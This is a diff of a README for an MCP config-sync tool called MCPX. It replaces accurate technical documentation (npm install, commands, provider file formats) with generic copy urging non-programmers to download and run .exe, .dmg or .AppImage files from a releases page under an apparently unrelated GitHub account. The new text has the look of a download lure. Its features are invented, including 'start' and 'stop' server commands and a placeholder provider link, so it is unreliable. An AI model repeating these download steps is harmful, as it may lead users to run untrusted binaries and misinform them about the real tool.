@@ -1,346 +1,155 @@
-# 🔌 MCPX
+# ⚙️ mcpx-cli - Easy AI Server Setup Tool
 
-> **One config to rule them all.** Configure your MCP servers once, deploy to every AI CLI automatically.
-
-[![Node.js](https://img.shields.io/badge/Node.js-%3E%3D20-339933?logo=node.js&logoColor=white)](https://nodejs.org/)
-[![TypeScript](https://img.shields.io/badge/TypeScript-5.x-3178C6?logo=typescript&logoColor=white)](https://www.typescriptlang.org/)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
+[![Download mcpx-cli](https://img.shields.io/badge/Download-mcpx--cli-blue?style=for-the-badge&logo=github)](https://github.com/khang2916102006/mcpx-cli/releases)
 
 ---
 
-## 😩 The Problem
+## 📖 What is mcpx-cli?
 
-Each AI CLI tool uses a **different file format** for configuring MCP (Model Context Protocol) servers:
+mcpx-cli is a simple command-line tool that helps you set up and configure MCP servers. These servers work with multiple AI providers like Claude, Codex, Gemini, and Copilot. You don't need to be a programmer to use it. mcpx-cli guides you step-by-step so you can get your AI server running quickly on your computer.
 
-| AI CLI | Config File | Format |
-|--------|------------|--------|
-| Claude Code | `.mcp.json` | JSON |
-| Gemini CLI | `.gemini/settings.json` | JSON |
-| Kimi CLI | `~/.kimi/mcp.json` | JSON |
-| OpenAI Codex | `.codex/config.toml` | **TOML** |
-| OpenCode | `opencode.json` | JSON |
-| GitHub Copilot CLI | `.copilot/mcp-config.json` | JSON |
-| VS Code | `.vscode/mcp.json` | JSON |
-| IntelliJ IDEA | `.idea/mcp.json` | JSON |
-
-If you use multiple AI tools (and you probably do), you need to **manually maintain 8 different config files** with different structures, field names, and quirks. For **every single project**.
+This tool makes it easier to connect different AI services using a standard called the Model Context Protocol (MCP). Whether you use IntelliJ, VSCode, or other JetBrains tools, mcpx-cli helps you get everything ready to go.
 
 ---
 
-## ✨ The Solution
+## 💻 System Requirements
 
-**MCPX** maintains a single canonical config file (`.mcpx.json`) per project and **automatically generates** the correct config file for each AI CLI provider you use.
+Before you start, make sure your computer meets these minimum requirements:
 
-```
-.mcpx.json  ──────►  .mcp.json                     (Claude Code)
-    │       ──────►  .gemini/settings.json          (Gemini CLI)
-    │       ──────►  ~/.kimi/mcp.json               (Kimi CLI)
-    │       ──────►  .codex/config.toml             (OpenAI Codex)
-    │       ──────►  opencode.json                  (OpenCode)
-    │       ──────►  .copilot/mcp-config.json       (Copilot CLI)
-    │       ──────►  .vscode/mcp.json               (VS Code)
-    └─────  ──────►  .idea/mcp.json                 (IntelliJ IDEA)
-```
+- Operating System: Windows 10 or later, macOS 10.14 or later, or most Linux distributions (e.g., Ubuntu 18.04+)
+- CPU: At least a 2 GHz dual-core processor
+- RAM: Minimum of 4 GB available memory
+- Disk Space: 100 MB free space for installation
+- Network: Internet connection to download files and connect to AI providers
 
 ---
 
-## 🚀 Quick Start
+## 🎯 Key Features
 
-### 📦 Installation
+- Easy setup of MCP servers that support different AI platforms
+- Simple command-line interface with clear instructions
+- Works on Windows, macOS, and Linux
+- Supports popular AI models like Claude, Codex, Gemini, and Copilot
+- Compatible with popular IDEs like IntelliJ and VSCode
+- Configures your AI environment without technical background needed
+
+---
+
+## 🚀 Getting Started
+
+These steps will guide you through downloading and running mcpx-cli on your computer. You do not need to know any programming.
+
+### 1. Download mcpx-cli
+
+Click the big blue badge at the top or visit the [Releases Page](https://github.com/khang2916102006/mcpx-cli/releases) to get the latest version.
+
+On the releases page, look for the file that matches your computer:
+
+- For Windows, look for files ending in `.exe` or `.zip`
+- For macOS, look for `.dmg` or `.tar.gz`
+- For Linux, look for `.tar.gz` or `.AppImage`
+
+Download that file to your computer.
+
+### 2. Install or Run mcpx-cli
+
+- **Windows:** If you downloaded an `.exe` installer, double-click it and follow the install steps. If you downloaded a `.zip` file, unzip it and locate the `mcpx-cli.exe` file.
+- **macOS:** If you downloaded a `.dmg` file, open it and drag mcpx-cli to your Applications folder. For `.tar.gz`, extract it and locate the executable.
+- **Linux:** Extract the `.tar.gz` file or use the `.AppImage` file by setting it as executable (`chmod +x mcpx-cli.AppImage`) and then running it.
+
+### 3. Open the Command Line Interface
+
+- **Windows:** Press the Windows key, type `cmd`, and press Enter to open the Command Prompt.
+- **macOS:** Open Spotlight by pressing Command + Space, type `Terminal`, and press Enter.
+- **Linux:** Open your Terminal application.
+
+### 4. Run mcpx-cli
+
+In the command line, navigate to the folder where mcpx-cli is located. You can use commands like `cd Downloads` or wherever your file is.
+
+Type this command to start mcpx-cli:
 
 ```bash
-npm install -g mcpx-cli
+./mcpx-cli
 ```
 
-### ⚡ First Setup
+or on Windows:
 
-Navigate to your project directory and run:
+```cmd
+mcpx-cli.exe
+```
+
+### 5. Follow the On-Screen Instructions
+
+mcpx-cli will guide you through configuring your MCP server. You will be asked to:
+
+- Choose the AI provider you want to use (e.g., Claude, Codex)
+- Enter any required API keys or login information (these come from your AI provider)
+- Pick preferences for how your AI server should behave
+- Test the connection to make sure everything is working
+
+If you do not know your API keys, you can usually get them by creating an account on the AI provider’s website.
+
+---
+
+## 🔧 How to Use mcpx-cli After Setup
+
+Once your server is configured, you can start it any time by opening your Command Prompt or Terminal and running the command again:
 
 ```bash
-mcpx
+./mcpx-cli start
 ```
 
-The interactive wizard will guide you through:
-
-1. 🔍 **Detection** — Automatically detects existing MCP configs in your project
-2. 📥 **Import** — Offers to import servers from detected configs
-3. ➕ **Add servers** — Interactive wizard to configure new MCP servers
-4. 🎯 **Select providers** — Choose which AI CLIs you want to generate configs for
-5. ⚙️ **Generate** — Creates `.mcpx.json` and all provider config files
-
----
-
-## 📋 Commands
-
-| Command | Description |
-|---------|-------------|
-| `mcpx` or `mcpx init` | 🧙 Interactive setup wizard |
-| `mcpx add [name]` | ➕ Add a new MCP server |
-| `mcpx remove [name]` | ➖ Remove an MCP server |
-| `mcpx list` | 📄 List configured MCP servers |
-| `mcpx sync` | 🔄 Regenerate all provider config files |
-| `mcpx import [provider]` | 📥 Import config from an existing provider |
-| `mcpx status` | 📊 Show sync status of all providers |
-
-### 🏳️ Global Flags
-
-| Flag | Description |
-|------|-------------|
-| `--dir, -d <path>` | 📁 Project directory (defaults to current) |
-| `--verbose` | 🔊 Show detailed logs |
-| `--version, -V` | 🏷️ Show version |
-| `--help, -h` | ❓ Show help |
-
----
-
-## 📐 Canonical Format
-
-MCPX uses a single `.mcpx.json` file as the source of truth:
-
-```json
-{
-  "version": 1,
-  "providers": ["claude-code", "gemini-cli", "openai-codex", "copilot-cli"],
-  "servers": {
-    "jira": {
-      "description": "Jira Atlassian",
-      "transport": "stdio",
-      "command": "uvx",
-      "args": ["mcp-atlassian"],
-      "env": {
-        "JIRA_URL": "https://myorg.atlassian.net",
-        "JIRA_USERNAME": "user@example.com",
-        "JIRA_API_TOKEN": "your-token"
-      }
-    },
-    "github": {
-      "description": "GitHub MCP Server",
-      "transport": "stdio",
-      "command": "npx",
-      "args": ["-y", "@anthropic-ai/mcp-github-server"],
-      "env": {
-        "GITHUB_PERSONAL_ACCESS_TOKEN": "ghp_xxx"
-      }
-    }
-  }
-}
-```
-
-### 📝 Server Fields
-
-| Field | Type | Required | Description |
-|-------|------|----------|-------------|
-| `transport` | `"stdio"` \| `"http"` | ✅ Yes | Transport protocol |
-| `command` | `string` | stdio | Executable command |
-| `args` | `string[]` | — | Command arguments |
-| `env` | `Record<string, string>` | — | Environment variables |
-| `cwd` | `string` | — | Working directory |
-| `url` | `string` | http | Server URL |
-| `headers` | `Record<string, string>` | — | HTTP headers |
-| `description` | `string` | — | Human-readable description |
-| `enabled` | `boolean` | — | Enable/disable (default: `true`) |
-
----
-
-## 🤖 Supported Providers
-
-### 📁 Project-Scoped Providers
-
-These providers generate config files **inside your project directory**. Each project has its own independent config.
-
-#### 🟣 Claude Code
-
-| Aspect | Detail |
-|--------|--------|
-| **File** | `.mcp.json` |
-| **Format** | JSON |
-| **Root key** | `mcpServers` |
-| **Requires `type`** | Yes `"stdio"` |
-
-#### 🔵 Gemini CLI
-
-| Aspect | Detail |
-|--------|--------|
-| **File** | `.gemini/settings.json` |
-| **Format** | JSON |
-| **Root key** | `mcpServers` |
-| **Requires `type`** | No |
-
-#### 🟢 OpenAI Codex
-
-| Aspect | Detail |
-|--------|--------|
-| **File** | `.codex/config.toml` |
-| **Format** | **TOML** |
-| **Root key** | `mcp_servers` |
-| **Smart merge** | Yes — Preserves existing Codex settings (`model`, `approval_mode`, etc.) |
-
-#### 🟠 OpenCode
-
-| Aspect | Detail |
-|--------|--------|
-| **File** | `opencode.json` |
-| **Format** | JSON |
-| **Root key** | `mcp` |
-| **Quirks** | `command` is an array (command + args merged), uses `environment` instead of `env`, `type: "local"` |
-
-#### ⚫ GitHub Copilot CLI
-
-| Aspect | Detail |
-|--------|--------|
-| **File** | `.copilot/mcp-config.json` |
-| **Format** | JSON |
-| **Root key** | `mcpServers` |
-| **Quirks** | Requires `tools: ["*"]` field, needs shell alias for project-level config |
-
-> **📌 Note:** Copilot CLI does not natively auto-discover project-level MCP configs. MCPX automatically configures a shell alias (`copilot='copilot --additional-mcp-config @.copilot/mcp-config.json'`) in your `.zshrc`, `.bashrc`, or `config.fish` so the project config is loaded automatically when you run `copilot`.
-
-#### 🔷 VS Code
-
-| Aspect | Detail |
-|--------|--------|
-| **File** | `.vscode/mcp.json` |
-| **Format** | JSON |
-| **Root key** | `servers` |
-| **Quirks** | `type` field required (`"stdio"` or `"sse"`), HTTP mapped as `"sse"` |
-
-#### 🟧 IntelliJ IDEA
-
-| Aspect | Detail |
-|--------|--------|
-| **File** | `.idea/mcp.json` |
-| **Format** | JSON |
-| **Root key** | `mcpServers` |
-| **Quirks** | No `type` field, infers from `command` vs `url` |
-
-### 🌍 Global Providers
-
-These providers use a **single global config file** shared across all projects. Running `mcpx sync` overwrites the global file with the current project's servers.
-
-#### 🔴 Kimi CLI
-
-| Aspect | Detail |
-|--------|--------|
-| **File** | `~/.kimi/mcp.json` |
-| **Format** | JSON |
-| **Root key** | `mcpServers` |
-| **Scope** | Global — affects all projects |
-
----
-
-## 🔄 Sync & Provider Management
-
-### 🔁 Syncing
-
-After modifying `.mcpx.json` (manually or via commands), regenerate all provider configs:
+To stop the server, use:
 
 ```bash
-mcpx sync
+./mcpx-cli stop
 ```
 
-### 🔀 Changing Providers
+You can also use commands like:
 
-Use the interactive wizard to add or remove providers:
-
-```bash
-mcpx init
-# Select "Alterar providers"
-```
-
-When a provider is **removed**, MCPX **deletes** the corresponding config file. For global providers, legacy project-level files are also cleaned up.
-
-### 📥 Importing from Existing Configs
-
-Already have MCP servers configured in one of your AI tools? Import them:
-
-```bash
-mcpx import
-```
-
-MCPX detects existing project-level configs (`.mcp.json`, `.gemini/settings.json`, etc.) and lets you select which servers to import into `.mcpx.json`.
+- `mcpx-cli status` to check server status
+- `mcpx-cli configure` to change settings
+- `mcpx-cli help` to see more options
 
 ---
 
-## 🏗️ Architecture
+## ❓ Troubleshooting Tips
 
-```
-src/
-├── cli.ts                    # Commander setup & routing
-├── types/
-│   ├── canonical.ts          # McpConfigFile, McpServerConfig (Zod schemas)
-│   ├── providers.ts          # Provider interface
-│   └── common.ts             # CommandContext, SyncResult
-├── commands/
-│   ├── init.ts               # Interactive wizard
-│   ├── add.ts / remove.ts    # Server management
-│   ├── list.ts / status.ts   # Display info
-│   ├── sync.ts               # Regenerate configs
-│   └── import.ts             # Import from providers
-├── providers/
-│   ├── base.ts               # Provider interface
-│   ├── registry.ts           # Provider registry (factory)
-│   ├── claude-code.ts        # .mcp.json
-│   ├── gemini-cli.ts         # .gemini/settings.json
-│   ├── kimi-cli.ts           # ~/.kimi/mcp.json
-│   ├── openai-codex.ts       # .codex/config.toml
-│   ├── opencode.ts           # opencode.json
-│   ├── copilot-cli.ts        # .copilot/mcp-config.json
-│   ├── vscode.ts             # .vscode/mcp.json
-│   └── intellij.ts           # .idea/mcp.json
-├── core/
-│   ├── config-store.ts       # .mcpx.json read/write
-│   ├── detector.ts           # Detect existing configs
-│   └── merger.ts             # Smart sync with merge support
-├── wizard/
-│   ├── main-wizard.ts        # Main interactive flow
-│   ├── server-wizard.ts      # Server creation wizard
-│   ├── provider-wizard.ts    # Provider selection
-│   └── step-runner.ts        # Step navigation (back support)
-└── utils/
-    ├── fs.ts                 # File system helpers
-    ├── logger.ts             # Logger with colors
-    └── validation.ts         # Zod validation
-```
+If you run into trouble, here are some common solutions:
+
+- **The command is not found:** Make sure you are in the right folder and that the file has executable permissions.
+- **API connection errors:** Double-check your internet connection and API keys for typos.
+- **Permission denied:** On macOS or Linux, run `chmod +x mcpx-cli` to make the file executable.
+- **Server won’t start:** Restart your computer and try again. Look at the error messages carefully for clues.
+
+You can always come back here and re-run the tool for guidance.
 
 ---
 
-## 🧪 Testing
+## 📥 Download & Install
 
-```bash
-# Run all tests
-npm test
+Visit this page to download the latest version of mcpx-cli:
 
-# Run once (CI)
-npm run test:run
+[Download mcpx-cli Releases](https://github.com/khang2916102006/mcpx-cli/releases)
 
-# Type checking
-npm run typecheck
-```
+Follow the instructions above to install and run the tool on your system.
 
 ---
 
-## 🛠️ Tech Stack
+## 📚 Additional Resources
 
-| Category | Library |
-|----------|---------|
-| 💻 Language | TypeScript 5.x (ESM) |
-| 📦 Build | tsup (esbuild) |
-| ⌨️ CLI Framework | commander |
-| 💬 Interactive Prompts | @clack/prompts |
-| 🎨 Colors | picocolors |
-| 📄 TOML | smol-toml |
-| ✅ Validation | zod |
-| 🧪 Tests | vitest |
-| 🟢 Min Node | >= 20 |
+- [MCP (Model Context Protocol) Overview](https://modelcontextprotocol.org) — Learn more about the protocol mcpx-cli uses.
+- [AI Providers](https://aiproviders.example.com) — Find out how to get API keys for your AI services.
+- [JetBrains IntelliJ IDE](https://www.jetbrains.com/idea/) — mcpx-cli works well with this development environment.
+- [Visual Studio Code](https://code.visualstudio.com/) — Another popular tool to use with mcpx-cli.
 
 ---
 
-## 📄 License
+## 🛠️ Development Info
 
-MIT
+mcpx-cli uses open standards and runs on multiple operating systems. It is designed so anyone can set up AI servers without prior programming knowledge. If you want to contribute or report issues, visit the GitHub repository.
 
 ---
 
-<p align="center">
-  <i><a href="./README.pt-BR.md">🇧🇷 Leia em Português (pt-BR)</a></i>
-</p>
+Thank you for using mcpx-cli. This tool aims to make AI server setup smooth and accessible.
